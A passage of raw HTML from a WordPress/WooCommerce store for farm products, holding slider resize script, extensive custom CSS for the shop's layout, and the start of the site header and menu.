					document.body.insertAdjacentHTML( 'beforeend', '<div class=\"wc-facebook-pixel-event-placeholder\"></div>' );
				}, false );

			</script>
			<!-- WooCommerce Facebook Integration End -->
			<meta name="generator" content="Powered by Slider Revolution 6.7.20 - responsive, Mobile-Friendly Slider Plugin for WordPress with comfortable drag and drop interface." />
<style class="wp-fonts-local">
@font-face{font-family:Inter;font-style:normal;font-weight:300 900;font-display:fallback;src:url('https://www.amalfarm.com/wp-content/plugins/woocommerce/assets/fonts/Inter-VariableFont_slnt,wght.woff2') format('woff2');font-stretch:normal;}
@font-face{font-family:Cardo;font-style:normal;font-weight:400;font-display:fallback;src:url('https://www.amalfarm.com/wp-content/plugins/woocommerce/assets/fonts/cardo_normal_400.woff2') format('woff2');}
</style>
<link rel="icon" href="https://www.amalfarm.com/wp-content/uploads/2025/01/favicon_amal32-32x32-1.png" sizes="32x32" />
<link rel="icon" href="https://www.amalfarm.com/wp-content/uploads/2025/01/favicon_amal32-32x32-1.png" sizes="192x192" />
<link rel="apple-touch-icon" href="https://www.amalfarm.com/wp-content/uploads/2025/01/favicon_amal32-32x32-1.png" />
<meta name="msapplication-TileImage" content="https://www.amalfarm.com/wp-content/uploads/2025/01/favicon_amal32-32x32-1.png" />
<script>function setREVStartSize(e){
			//window.requestAnimationFrame(function() {
				window.RSIW = window.RSIW===undefined ? window.innerWidth : window.RSIW;
				window.RSIH = window.RSIH===undefined ? window.innerHeight : window.RSIH;
				try {
					var pw = document.getElementById(e.c).parentNode.offsetWidth,
						newh;
					pw = pw===0 || isNaN(pw) || (e.l=="fullwidth" || e.layout=="fullwidth") ? window.RSIW : pw;
					e.tabw = e.tabw===undefined ? 0 : parseInt(e.tabw);
					e.thumbw = e.thumbw===undefined ? 0 : parseInt(e.thumbw);
					e.tabh = e.tabh===undefined ? 0 : parseInt(e.tabh);
					e.thumbh = e.thumbh===undefined ? 0 : parseInt(e.thumbh);
					e.tabhide = e.tabhide===undefined ? 0 : parseInt(e.tabhide);
					e.thumbhide = e.thumbhide===undefined ? 0 : parseInt(e.thumbhide);
					e.mh = e.mh===undefined || e.mh=="" || e.mh==="auto" ? 0 : parseInt(e.mh,0);
					if(e.layout==="fullscreen" || e.l==="fullscreen")
						newh = Math.max(e.mh,window.RSIH);
					else{
						e.gw = Array.isArray(e.gw) ? e.gw : [e.gw];
						for (var i in e.rl) if (e.gw[i]===undefined || e.gw[i]===0) e.gw[i] = e.gw[i-1];
						e.gh = e.el===undefined || e.el==="" || (Array.isArray(e.el) && e.el.length==0)? e.gh : e.el;
						e.gh = Array.isArray(e.gh) ? e.gh : [e.gh];
						for (var i in e.rl) if (e.gh[i]===undefined || e.gh[i]===0) e.gh[i] = e.gh[i-1];
											
						var nl = new Array(e.rl.length),
							ix = 0,
							sl;
						e.tabw = e.tabhide>=pw ? 0 : e.tabw;
						e.thumbw = e.thumbhide>=pw ? 0 : e.thumbw;
						e.tabh = e.tabhide>=pw ? 0 : e.tabh;
						e.thumbh = e.thumbhide>=pw ? 0 : e.thumbh;
						for (var i in e.rl) nl[i] = e.rl[i]<window.RSIW ? 0 : e.rl[i];
						sl = nl[0];
						for (var i in nl) if (sl>nl[i] && nl[i]>0) { sl = nl[i]; ix=i;}
						var m = pw>(e.gw[ix]+e.tabw+e.thumbw) ? 1 : (pw-(e.tabw+e.thumbw)) / (e.gw[ix]);
						newh =  (e.gh[ix] * m) + (e.tabh + e.thumbh);
					}
					var el = document.getElementById(e.c);
					if (el!==null && el) el.style.height = newh+"px";
					el = document.getElementById(e.c+"_wrapper");
					if (el!==null && el) {
						el.style.height = newh+"px";
						el.style.display = "block";
					}
				} catch(e){
					console.log("Failure at Presize of Slider:" + e)
				}
			//});
		  };</script>
<style id="wp-custom-css">
#header .header-main {
    border-bottom: 1px solid #f4f4f4;
}
#header .main-menu > li.menu-item > a{
    font-size: 16px;
    font-weight: 500;
    padding: 22px 7px 22px 7px;
    text-transform: uppercase;
}
.my-subscription .form-valid-sub,
.my-subscription .form-valid-sub p{
	display: flex;
    width: 85%;
    margin: 0 auto;
}
.tparrows:before{
	color:#ffffff !important;
}
.my-subscription .form-valid-sub input[type=text]{
	  padding: 12px 15px;
    height: auto;
    line-height: normal;
    font-size: 14px;
    width: 75%;
    border-radius: 10px 0px 0px 10px;
}
.my-subscription .widget_wysija_cont .wysija-submit{
		display: block; 
    margin-top: 0px !important;
    padding: 12px 15px;
    width: 25%;
    border-radius: 0px 10px 10px 0px;
    background-color: #27A249;
}
#footer .footer-bottom{
	padding-bottom:0;
}
#footer .footer-bottom .footer-center{
	padding:10px 18px;
}
.footer-main{
	padding:50px 0;
}
#footer .widget > div > ul li,
#footer a:not(.btn), 
#footer .tooltip-icon,
#footer .widget-title{
	color:#ffffff;
}
#footer .footer-bottom,
#footer{
    background-color: #259743;
}
.footer-copyright{
	color:#dedede;
}
#footer .footer-bottom .footer-center {
    border-top: 1px solid #c1f9d0;
}
.single_add_to_cart_button,
.button.pisol_single_buy_now.pisol_buy_now_button.pisol_type_simple,
.button.pisol_single_buy_now.pisol_buy_now_button.pisol_type_variable{
    background: #27A249 !important;
    outline: none;
    border-radius: 10px;
    border: 1px solid #27A249;
	  height: 3rem !important;
    padding: 0 2em !important;
    overflow: hidden;
    text-transform: uppercase;
    font-size: 1em;
    letter-spacing: -0.015em;
    font-weight: 500;
    line-height: 3rem;
		width: auto !important;
    margin: 0px 20px !important;
}
.single_add_to_cart_button:hover,
.button.pisol_single_buy_now.pisol_buy_now_button.pisol_type_simple:hover,
.button.pisol_single_buy_now.pisol_buy_now_button.pisol_type_variable:hover{
	background: #e27e27 !important;
	border: 1px solid #e27e27;
}
.single_variation_wrap,
.cart{
	margin-top:0 !important;
}
.single-product .product_title {
    font-size: 1.6rem;
    line-height: 1.2;
    color: #222529;
    letter-spacing: 0.02em;
    font-weight: 400;
    margin-bottom: 0.2em;
}
button:focus{
	outline:none;
}
#header.sticky-header .header-main .container {
    min-height: 85px;
}
.elementor-1041 .elementor-element.elementor-element-1059698 > .elementor-widget-container,
.elementor-1041 .elementor-element.elementor-element-121883e > .elementor-widget-container{
	background:none;
}
.porto-sicon-img.porto-u-circle-img img{
	top:50%;
}
.custom-introduction-left-f .porto-sicon-img.porto-u-circle-img img{ 
	top:75%;
}
.elementor-testimonial-wrapper .elementor-testimonial-content:before{
	color:#e27e27;
}
ul.products li.product-col .woocommerce-loop-product__title{
	  font-size: 18px;
    font-weight: 400;
}
ul.products li.product-col h3{
    color:#333333;
	  padding:0 30px;
}
.sticky-product.pos-bottom .product-name{
	display:none;
}
.product-image .labels .onsale, .summary-before .labels .onsale {
    background: #e27e27;
    color: #ffffff;
    /* padding: 15px; */
    /* border-radius: 50%; */
    width: 65px;
    height: 30px;
    line-height: 22px;
    font-size: 12px;
    text-align: center;
}
.post-content .entry-title{
	text-align:center;
	font-size:35px;
	font-weight: 500;
}
body.single-post article.post .post-meta{
	text-align:center;
}
.header-top p{
	  margin: 0;
    font-size: 14px;
    color: #ffffff;
    font-weight: 400;
}
.header-top p a{
	color:#ffffff !important;
}
.header-top p span{
	margin:0 35px;
}
.cart-popup{
	margin-right:0 !important;
}
.header-top {
    background-color: #27A249;
}
#footer .share-links {
    max-width: 200px;
}
.woo-page-header.page-header-8 ul{
	display:none;
}
.single_variation_wrap, .single-product .cart:not(.variations_form){
	border-top: 0;
	border-bottom:0;
}
a.continuee {
    display: block;
	font-weight:500;
}
a.continuee span {
	margin: 0 25px;
  font-weight: 500;
}
html .btn-v-dark, 
.cart-popup .button.checkout, .wishlist_table .add_to_cart.button {
    color: #fff;
    background-color: #27a249;
    border: none;
    border-radius: 10px;
}
.wc-action-btn.button, 
.order-again .button, 
.btn-v-dark{
	font-weight: 500;
  text-transform: capitalize;
  font-size: 14px;
}
html .btn-v-dark:hover, 
.cart-popup .button.checkout:hover, .wishlist_table .add_to_cart.button:hover {
    color: #ffffff;
    background-color: #238e40;
}
.single-product .product-summary-wrap .yith-wcwl-add-to-wishlist{
	margin-right:30px;
}
.wc-action-btn.view-cart-btn.button.wc-forward.ml-2{
	display:none;
}
.product-template-default .continuee{
	display:none;
}
.product-template-default.single-add-to-cart .continuee{
	display:block;
}
.product-thumbs-slider.owl-carousel .owl-item.selected .img-thumbnail, html:not(.touch) .product-thumbs-slider .owl-item:hover .img-thumbnail {
    border: 1px solid #27a249;
}
.cust-testimonial.owl-carousel .elementor-widget-wrap {
    background-color: #f4f4f4;
    padding: 20px;
    border-radius: 15px;
    height: 370px;
}
.cust-testimonial.owl-carousel .elementor-testimonial-image {
    top: 15%;
}
.thumb-info.thumb-info-bottom-info .thumb-info-title{
	font-size: 14px;
  font-weight: 400;
}
.thumb-info:hover .thumb-info-title {
    background: #27A249 !important;
}
.no-breadcrumbs .main-content,
.main-content{
    padding-bottom: 0;
}
.post-modern.hide-post-date .post-image.single{
	display:none;
} 
#footer a:not(.btn) {
    font-size: 14px;
}
#footer .widget p {
    color: #ffffff;
    font-size: 14px;
}
.img-section{
	box-shadow: inset 5px 5px 5px rgba(0,0,0,0.05),
                       inset -5px -5px 5px rgba(225,225,225,0.05),
                       inset -5px -5px 5px rgba(0,0,0,0.05),
                       inset -5px -5px 5px rgba(225,225,225,0.05);
border-radius:15px;
	margin:20px;
}

#footer .share-links a:not(:hover), .footer-top .share-links a:not(:hover) {
    background: #ffffff;
    color: #27A249;
}
.footer-copyright a{
	font-size:12px;
	color: #dedede !important;
}
.page-top{
	border-top: 0;
    padding: 0;
	border-bottom:0;
}
.tax-product_cat .page-top,
.woocommerce-shop .page-top{
    border-top: 0;
/*     padding: 160px 0; */
	background-position:center top !important;
	background-size:100% !important;
	min-height:350px;
	background-repeat:no-repeat;
}
.woocommerce-shop .breadcrumbs-wrap.pt-left{
	display:none;
}
.tax-product_cat .container.hide-title{
	display:none;
}
.post-item.post-title-simple .post-excerpt{
	display: flex;
  flex-direction: column;
}

@media (min-width: 320px) and (max-width: 480px) 
{
.tax-product_cat .page-top
	{
    border-top: 0;
    padding: 29px 0;
	}

@media (min-width: 480px) and (max-width: 767px) 
{
.tax-product_cat .page-top
	{
    border-top: 0;
    padding: 44px 0;
	}

#footer .footer-bottom .container>div {
    padding: 10px 0;
    text-align: center;
}
.bg-image{
	-webkit-filter: grayscale(100%); 
  filter: grayscale(100%);
}
#header.sticky-header .header-main.change-logo .logo img {
    transform: scale(1);
}
.fixed-header #header .searchform-popup .searchform{
	width:325px;
}
#footer {
    margin-bottom: 0 !important;
}
#header .header-top .custom-html, #header .header-top .separator{
		display:block;
	}
#side-nav-panel .share-links{
		display:none;
}
ul.products li.product-default:hover .add-links .quickview{
	display:none;
}
.mega-menu .popup li.menu-item>a{
	font-size:14px !important;
}
.add_to_wishlist.single_add_to_wishlist{
	display:none;
}
.single-product .product-summary-wrap .yith-wcwl-add-to-wishlist {
    margin-right: 0px !important;
}
.desc-img {
    display: flex;
	  width:100%;
}
.desc-img .img-sec {
    width: 50%;
    margin: 10px;
    display: flex;
    justify-content: center;
    align-items: center;
    text-align: center;
    flex-wrap: wrap;
    background-color: #f4f4f4;
    margin-right: 20px;
    padding: 15px;
    border-radius: 15px;
}
.desc-img .img-sec .img-caption {
    font-size: 16px;
    font-weight: 400;
    margin-top: 10px;
    text-align: center;
	  text-transform: uppercase;
}
.mimag-sect {
    display: flex;
}
.products.related{
	margin-top:40px;
}
#footer .share-links {
    max-width: 215px;
}
*:not(#side-nav-panel):not(.product-share)>.share-links>.share-facebook, *:not(#side-nav-panel):not(.product-share)>.share-links>.share-twitter {
    float: none;
}
#footer .share-instagram {
    margin-left: 5px !important;
}
.featured-box .shop_table .product-remove .remove {
    font-size: 24px;
    font-weight: 600;
}
.checkout-button.button.alt.wc-forward{
	width:100%;
}
.button.continue{
	margin-bottom:10px;
	border-radius:7px;
}
.btn-default.btn {
    background: #27a249;
    box-shadow: none !important;
	  color: #ffffff;
}
.btn-default.btn:hover{
	border-color: #238e40;
  background-color: #238e40;
  color: #ffffff;
}
.wc-delivery-time-response {
    margin-bottom: 0;
    width: 100%;
}
.pin_div,
.avlpin{
    padding: 0 !important;
    margin: 0 0 20px 0 !important;
    color: #000000 !important;
    width: 36% !important;
}
.delivery-info-wrap{
	display:none !important;
}
.single_variation_wrap, 
.single-product .cart:not(.variations_form){
	padding: 0 !important;
}
.single-product .variations{
	margin-bottom:15px;
}
.form-row .select2-container--default .select2-selection--single{
	height: auto !important;
}
.woocommerce-checkout input[type="text"], 
.woocommerce-checkout input[type="email"], 
.woocommerce-checkout input[type="tel"], 
.woocommerce-checkout input[type="password"]{
	line-height:normal !important;
}
.form-row label{
	font-size:12px;
}
.woocommerce-checkout .select2-container--default .select2-selection--single .select2-selection__rendered{
	padding:0 12px;
}
.form-row .select2-container--default .select2-selection--single .select2-selection__arrow{
	top:22px !important;
}
.cart_totals .order-total .amount, .review-order.shop_table .order-total .amount{
	font-weight:400;
}
.shop_table tfoot tr:first-child th, .shop_table tfoot tr:first-child td{
	padding:7px 10px 10px;
}
.checkout_coupon .input-text.py-0{
	line-height:2.3 !important;
}
.blog-posts .post .entry-title{
	text-align:left;
}
/*.searchform-popup .search-toggle i:before {
    content: '';
    background: url(../wp-content/uploads/2021/05/search.png) no-repeat;
    position: absolute;
    width: 43px;
    height: 56px;
    top: -14px;
    left: 0px;
    background-position: center;
    background-size: 68%;
}*/
.business-title{
	font-size: 1.1em;
  padding: 10px 30px 20px 34px;
}
/****************************/
@media (min-width: 1281px) {
  .my-subscription .form-valid-sub, .my-subscription .form-valid-sub p{
		width:85%;
		float:right;
		margin-right: 0;
	}
.cust-testimonial.owl-carousel .elementor-widget-wrap {
    height: 425px;
}
#header .searchform-popup, .header-main .porto-block{
		display:block !important;
		top: -3px;
    left: 10px;
	}
	.search-toggle{
		font-size:26px !important;
		color: #282d3b !important;
		opacity:0.5;
	}
#header .main-menu > li.menu-item > a,
#header .main-menu .narrow li.menu-item > a{
		color:#000000;
	}
	#mini-cart .minicart-icon,
.elementor-120 .elementor-element.elementor-element-6db159c .porto-icon{
		font-size:26px !important;
	}
#mini-cart.minicart-arrow-alt .cart-head:after{
		margin-left:7px;
		margin-top:7px
	}
.elementor-120 .elementor-element.elementor-element-6db159c .porto-sicon-header p{
		font-size:14px !important;
	}
.featured-box.featured-box-primary.align-left{
		width: 70%;
    float: left;
	}
	.cart-collaterals{
		width: 28%;
    float: right;
    margin-left: 2%;
	}
	.cart-collaterals .featured-box.featured-box-primary.align-left{
		width:100%;
	}
.woocommerce-checkout .column1.boxed .container,
.woocommerce-cart .column1.boxed .container,
#main .container{
	padding:0 40px;
}
.page-top .container.hide-title{
		padding:12px 40px 0 40px;
	}
}

@media (min-width: 1025px) and (max-width: 1280px) {
 .my-subscription .form-valid-sub, .my-subscription .form-valid-sub p{
		width:85%;
		float:right;
	 margin-right: 0;
	}
.cust-testimonial.owl-carousel .elementor-widget-wrap {
    height: 425px;
}
#header .searchform-popup, .header-main .porto-block{
		display: block !important;
    top: -2px;
    left: 16px;
	}
	.search-toggle{
		font-size:26px !important;
		color: #282d3b !important;
		opacity:0.5;
	}
#header .main-menu > li.menu-item > a,
	#header .main-menu .narrow li.menu-item > a{
		color:#000000;
	}
#header .main-menu > li.menu-item > a,
#header .main-menu .narrow li.menu-item > a{
		color:#000000;
	}
	#mini-cart .minicart-icon,
.elementor-120 .elementor-element.elementor-element-6db159c .porto-icon{
		font-size:26px !important;
	}
#mini-cart.minicart-arrow-alt .cart-head:after{
		margin-left:7px;
		margin-top:7px
	}
.elementor-120 .elementor-element.elementor-element-6db159c .porto-sicon-header p{
		font-size:14px !important;
	}
.woocommerce-checkout .column1.boxed .container,
.woocommerce-cart .column1.boxed .container{
	padding:0 40px;
}
#main .container{
	padding:0 40px;
}
.page-top .container.hide-title{
		padding:12px 40px 0 40px;
	}
}

@media (min-width: 768px) and (max-width: 1024px) {
 .my-subscription .form-valid-sub, .my-subscription .form-valid-sub p{
		width:100%;
	}
.cust-testimonial.owl-carousel .elementor-widget-wrap {
    height: 415px;
}
	#side-nav-panel #menu-menu1-2{
		display:none;
	}
#header .searchform-popup, .header-main .porto-block{
		display:block !important;
		top: 3px;
    left: 7px;
	}
	.search-toggle{
		font-size:20px !important;
		color: #282d3b !important;
		opacity:0.6;
	}	
	ul.products li.product-col .woocommerce-loop-product__title{
		font-size: 14px;
	}
}

@media (min-width: 768px) and (max-width: 1024px) and (orientation: landscape) {
.my-subscription .form-valid-sub, .my-subscription .form-valid-sub p{
		width:100%;
	}
.cust-testimonial.owl-carousel .elementor-widget-wrap {
    height: 415px;
}
	#side-nav-panel #menu-menu1-2{
		display:none;
	}
.cart{
		width: 100%;
    text-align: center;
    align-items: center;
    justify-content: center;
	}
	.cart .single_add_to_cart_button.button.alt{
		margin-right: 0!important;
	}
	.button.pisol_single_buy_now.pisol_buy_now_button.pisol_type_simple{
		width:100% !important;
	}
	.product-share{
		width: 100%;
		text-align:center;
	}
}

@media (min-width: 481px) and (max-width: 767px) {
  .my-subscription .form-valid-sub, .my-subscription .form-valid-sub p{
		width:100%;
	}
.cust-testimonial.owl-carousel .elementor-widget-wrap {
    height: 415px;
}
	#side-nav-panel #menu-menu1-2{
		display:none;
	}
	#header .header-main .header-left, #header .header-main .header-center, #header .header-main .header-right, .fixed-header #header .header-main .header-left, .fixed-header #header .header-main .header-right, .fixed-header #header .header-main .header-center{
	padding-top:0px;
	padding-bottom:0px;
}
#header .header-main .my-account, #mini-cart .minicart-icon {
    font-size: 20px;
}
#mini-cart.minicart-arrow-alt .cart-head:after{
		margin-left:7px;
		margin-top:7px;
	}
	#header .searchform-popup, .header-main .porto-block{
		display:block !important;
		top: 3px;
    left: 7px;
	}
	.search-toggle{
		font-size:20px !important;
		color: #282d3b !important;
		opacity:0.6;
	}
.fixed-header #header .searchform-popup .searchform{
		width:280px;
	}
	#header .header-right .searchform{
		right:-250%;
	}
.cart{
		width: 100%;
    text-align: center;
    align-items: center;
    justify-content: center;
	}
	.cart .single_add_to_cart_button.button.alt{
		margin-right: 0!important;
	}
	.button.pisol_single_buy_now.pisol_buy_now_button.pisol_type_simple{
		width:100% !important;
		margin-top:15px !important;
	}
.product-summary-wrap .price{
		text-align: center;
    margin-bottom: 0;
	}
.product-summary-wrap .description {
    display: flex;
    align-items: center;
    justify-content: left;
    text-align: justify;
    padding: 0 20px;
}
	.product-summary-wrap .description ul{
		padding:0;
	}
	.single-product .variations{
		width: 75%;
    min-width: 75%;
    margin-top: 15px;
    margin: 20px auto 0 auto;
	}
	.single-product .variations label{
		text-align:right;
	}
.woocommerce-variation-add-to-cart.variations_button.woocommerce-variation-add-to-cart-disabled{
		display: block;
	}
.button.pisol_single_buy_now.pisol_buy_now_button.pisol_type_variable{
		width: 100% !important;
    padding: 0 30px !important;
    margin: 15px 0 0 0 !important;
	}
	#side-nav-panel{
		background-color: #27A249;
	}
#side-nav-panel .accordion-menu li:not(:last-child) {
    border-bottom: 1px solid #27A249;
}
.accordion-menu li.menu-item>a {
    padding: 7px 15px;
    font-size: 14px;
}
#side-nav-panel .accordion-menu li.menu-item.active > a, #side-nav-panel .menu-custom-block a:hover {
    background-color: #389452;
}
#footer .footer-main > .container {
  padding-top: 0.7rem;
	padding-bottom: 0.7rem;
}
.desc-img {
    display: block;
    width: 100%;
}
.desc-img .img-sec{
    width: 50%;
		margin: 10px;
}
.desc-img .mimag-sect {
	display: flex;
  width: 100%;
}
	.woocommerce-tabs .tab-content p{
		text-align:justify;
	}
.product-share{
		width: 100%;
		text-align:center;
	}
}
@media (max-width: 991px){
#header .searchform-popup .search-toggle {
    display: block;
}
*:not(#side-nav-panel):not(.product-share)>.share-links>.share-facebook, *:not(#side-nav-panel):not(.product-share)>.share-links>.share-twitter {
    float: none;
}
.cart{
		width: 100%;
    text-align: center;
    align-items: center;
    justify-content: center;
	}
.cart .single_add_to_cart_button.button.alt{
		margin-right: 0!important;
	}
	.button.pisol_single_buy_now.pisol_buy_now_button.pisol_type_simple{
		width:100% !important;
		margin-top:15px !important;
	}
.button.pisol_single_buy_now.pisol_buy_now_button.pisol_type_variable{
		width: 100% !important;
    padding: 0 30px !important;
    margin: 15px 0 0 0 !important;
	}
	#side-nav-panel{
		background-color: #27A249;
	}
#side-nav-panel .accordion-menu li:not(:last-child) {
    border-bottom: 1px solid #27A249;
}
.accordion-menu li.menu-item>a {
    padding: 7px 15px;
    font-size: 14px;
}
#side-nav-panel .accordion-menu li.menu-item.active > a, #side-nav-panel .menu-custom-block a:hover {
    background-color: #389452;
}
#footer .footer-main > .container {
  padding-top: 0.7rem;
	padding-bottom: 0.7rem;
}
.desc-img {
    display: block;
    width: 100%;
}
.desc-img .img-sec{
    width: 50%;
		margin: 10px;
}
.desc-img .mimag-sect {
	display: flex;
  width: 100%;
}
	.woocommerce-tabs .tab-content p{
		text-align:justify;
	}
	.product-share{
		width: 100%;
		text-align:center;
	}
}
@media (min-width: 320px) and (max-width: 480px) {
	.my-subscription .form-valid-sub, .my-subscription .form-valid-sub p{
		width:100%;
	}
.cust-testimonial.owl-carousel .elementor-widget-wrap {
    height: 415px;
}
	#header.sticky-header .header-main.change-logo .logo img {
    transform: scale(0.8);
}
	#side-nav-panel #menu-menu1-2{
		display:none;
	}
	#header .header-main .header-left, #header .header-main .header-center, #header .header-main .header-right, .fixed-header #header .header-main .header-left, .fixed-header #header .header-main .header-right, .fixed-header #header .header-main .header-center{
	padding-top:0px;
	padding-bottom:0px;
}
#header .header-main .my-account, #mini-cart .minicart-icon {
    font-size: 20px;
}
#mini-cart.minicart-arrow-alt .cart-head:after{
		margin-left:7px;
		margin-top:7px;
	}
	#header .searchform-popup, .header-main .porto-block{
		display:block !important;
		top: 3px;
    left: 7px;
	}
	.search-toggle{
		font-size:20px !important;
		color: #282d3b !important;
		opacity:0.6;
	}
.fixed-header #header .searchform-popup .searchform{
		width:280px;
	}
	#header .header-right .searchform{
		right:-250%;
	}
	#header .searchform-popup .search-toggle {
    display: block;
}
*:not(#side-nav-panel):not(.product-share)>.share-links>.share-facebook, *:not(#side-nav-panel):not(.product-share)>.share-links>.share-twitter {
    float: none;
}
.cart{
		width: 100%;
    text-align: center;
    align-items: center;
    justify-content: center;
		margin-top:0 !important;
	}
	.cart .single_add_to_cart_button.button.alt{
		margin-right: 0!important;
	}
	.button.pisol_single_buy_now.pisol_buy_now_button.pisol_type_simple{
		width:100% !important;
		margin-top:15px !important;
	}
.product-summary-wrap .price{
		text-align: center;
    margin-bottom: 0;
	}
.product-summary-wrap .description {
    align-items: center;
    justify-content: left;
    text-align: justify;
    padding: 0 5px;
}
	.product-summary-wrap .description ul{
		padding:0;
	}
	.single-product .variations{
		width: 75%;
    min-width: 75%;
    margin-top: 15px;
    margin: 20px auto 0 auto;
	}
	.single-product .variations label{
		text-align:right;
	}
.woocommerce-variation-add-to-cart.variations_button.woocommerce-variation-add-to-cart-disabled{
		display: block;
	}
.button.pisol_single_buy_now.pisol_buy_now_button.pisol_type_variable{
		width: 100% !important;
    padding: 0 30px !important;
    margin: 15px 0 0 0 !important;
	}
	#side-nav-panel{
		background-color: #27A249;
	}
#side-nav-panel .accordion-menu li:not(:last-child) {
    border-bottom: 1px solid #27A249;
}
.accordion-menu li.menu-item>a {
    padding: 7px 15px;
    font-size: 14px;
}
#side-nav-panel .accordion-menu li.menu-item.active > a, #side-nav-panel .menu-custom-block a:hover {
    background-color: #389452;
}
#footer .footer-main > .container {
  padding-top: 0.7rem;
	padding-bottom: 0.7rem;
}
.desc-img {
    display: block;
    width: 100%;
}
.desc-img .img-sec{
    width: 50%;
		margin: 10px;
}
.desc-img .mimag-sect {
	display: flex;
  width: 100%;
}
	.woocommerce-tabs .tab-content p{
		text-align:justify;
	}
.pin_div, 
	.avlpin{
		width:100% !important;
		margin: 20px auto !important;
	}
.woocommerce-variation-add-to-cart.variations_button{
		width: 100%;
    padding: 10px 0;
    display: block;
	}
	.widget.widget_text li{
	margin-bottom:7px;
	}
/*.searchform-popup .search-toggle i:before {
    content: '';
    background: url(../wp-content/uploads/2021/05/search.png) no-repeat;
    position: absolute;
    width: 43px;
    height: 56px;
    top: -18px;
    left: -6px;
    background-position: center;
    background-size: 50%;
}*/
}
.product_title.entry-title,
.product-summary-wrap .price{
	color: #27a249;
}
.footer-image .elementor-container.elementor-column-gap-no{
	padding:0 !important;
}
.welocme p{
	text-align: center !important;
	font-size: 35px;
}
#shiprocket_pincode_check,
#check_pincode{
	display:none;
}
.also-available a{
	margin-right: 15px;
}
.star-rating span:before {
	color: #e27e27;}
.new-products__shape-1 img{
    top: -95px;
    right: -119px;
	display:block;
	position:absolute;
}
.new-products__shape-2 img{
    top: -150px;
    left: -150px;
	display:block;
	position:absolute;
}
textarea.form-control {
    height: 80px;
    min-height: 80px;
}
input.wpcf7-form-control.wpcf7-submit.btn.btn-borders.btn-lg.btn-secondary {
    width: 100%;
}
.mrp-text,
.inc-text{
	color: #000;
   font-size: 12px;
}
.inc-text{
	margin-left:10px;
	font-weight:400;
}
del .inc-text,
.woocommerce-cart-form .inc-text,
.mini-cart .inc-text,
.review-order .inc-text{
	display:none;
}
ul.products li.product-col .price{
		font-size:14px !important;
	}
.rtrn p{
	font-size: 16px;
	font-weight:500;
	margin-bottom:7px;
	margin-top:20px;
}
.summary-before .labels {
    margin-right: 10px;
	left:inherit;
	right:0.8em;
}
.summary-before .labels .onsale {
    width: 45px;
    height: 45px;
    line-height: 30px;
    border-radius: 50%;
}
.woocommerce-cart-form__contents .mrp-text,
.review-order .mrp-text{
	font-size:14px;
}
html .btn-borders.btn-secondary {
    background: #259743;
    border-color: #259743;
    color: #fff;
}
.our-products small,
.archive-products small{
	display:none;
}
.our-products .inc-text,
.archive-products .inc-text,
.sidebar-content .inc-text,
.related.products .inc-text,
.product-col .inc-text{
	font-weight: 400;
  font-size: 12px;
}

.price small{
    font-size: 14px;
    font-weight: 400;
    color: #0000009a;
}
.award a{
	font-size: 14px;
    padding: 7px 15px;
    background-color: #27A249;
    color: #fff;
    display: inline-block;
    margin-top: 15px;
    border-radius: 7px;
}
.section {
  padding:0 0 60px 0;
	border-top:1px;
}
.my-media .col-md-6{
	margin:10px 0;
}
ul.products li.product-col .woocommerce-loop-product__title{
	white-space:normal;
}
	.woocommerce-cart-form__cart-item.cart_item .inc-text{
		display:none;
	}
.single-product .product-summary-wrap .price .price small{
		font-size:12px !important;
	}  .desc-img {
    display: flex;
    width: 100%;
}
	span.mrp-text {
    font-weight: 400;
    font-size: 18px;
}
	small {
    font-size: 14px;
}
	span.inc-text {
    font-size: 14px;
}
	.wpcf7 form.sent .wpcf7-response-output{
		color:#fff;
	}
	.wpcf7-submit{
    background-color: #e27e27 !important;
    border: 1px solid #e27e27 !important;
    outline: none;
    box-shadow: none;
}
.term-description h2{
		font-size:24px;
		margin-bottom:20px;
	}
	.page-links, 
	.pagination
 {
    float: right;
    margin: 20px 0;
}
</style>
	<link rel='stylesheet' id='rs-plugin-settings-css' href='//www.amalfarm.com/wp-content/plugins/revslider/sr6/assets/css/rs6.css?ver=6.7.20' media='all' />
<style id="rs-plugin-settings-inline-css">
#rs-demo-id {}
/*# sourceURL=rs-plugin-settings-inline-css */
</style>

</head>
	<body class="wp-singular post-template-default single single-post postid-10127 single-format-standard wp-embed-responsive wp-theme-porto wp-child-theme-porto-child theme-porto woocommerce-no-js yith-wcan-free porto-rounded porto-breadcrumbs-bb login-popup full blog-1 elementor-default elementor-kit-761 elementor-page elementor-page-10127">
	
	<div class="page-wrapper"><!-- page wrapper -->
		
											<!-- header wrapper -->
				<div class="header-wrapper">
										

	<header  id="header" class="header-builder">
	
	<div class="header-top header-has-center header-has-center-sm"><div class="header-row container"><div class="header-col header-center"><div class="custom-html"><marquee><p> <span>Free Shipping across India<span style="margin-left:50px;"> | <span style="margin-left: 50px;">Upto 30% off on all Products</span></span></span></p> </marquee></div></div></div></div><div class="header-main header-has-center header-has-not-center-sm"><div class="header-row container"><div class="header-col header-left hidden-for-sm">
	<div class="logo">
	<a href="https://www.amalfarm.com/" title="Amalfarm - Magic of the place"  rel="home">
		<img class="img-responsive sticky-logo sticky-retina-logo" width="180" height="85" src="//www.amalfarm.com/wp-content/uploads/2021/12/Amal_Farm_Logo_180x65_Reg.png" alt="Amalfarm" /><img class="img-responsive standard-logo retina-logo" width="180" height="85" src="//www.amalfarm.com/wp-content/uploads/2021/12/Amal_Farm_Logo_180x65_Reg.png" alt="Amalfarm" />	</a>
	</div>
	</div><div class="header-col visible-for-sm header-left"><a class="mobile-toggle" href="#" aria-label="Mobile Menu"><i class="fas fa-bars"></i></a>
	<div class="logo">
	<a href="https://www.amalfarm.com/" title="Amalfarm - Magic of the place"  rel="home">
		<img class="img-responsive sticky-logo sticky-retina-logo" width="180" height="85" src="//www.amalfarm.com/wp-content/uploads/2021/12/Amal_Farm_Logo_180x65_Reg.png" alt="Amalfarm" /><img class="img-responsive standard-logo retina-logo" width="180" height="85" src="//www.amalfarm.com/wp-content/uploads/2021/12/Amal_Farm_Logo_180x65_Reg.png" alt="Amalfarm" />	</a>
	</div>
	</div><div class="header-col header-center hidden-for-sm"><ul id="menu-menu1" class="main-menu mega-menu show-arrow"><li id="nav-menu-item-780" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-home narrow"><a href="https://www.amalfarm.com/">Home</a></li>
<li id="nav-menu-item-1038" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children has-sub narrow"><a class="nolink" href="#">About Us</a>
<div class="popup"><div class="inner" style=""><ul class="sub-menu porto-narrow-sub-menu">
	<li id="nav-menu-item-782" class="menu-item menu-item-type-post_type menu-item-object-page" data-cols="1"><a href="https://www.amalfarm.com/about-us/">About Us</a></li>
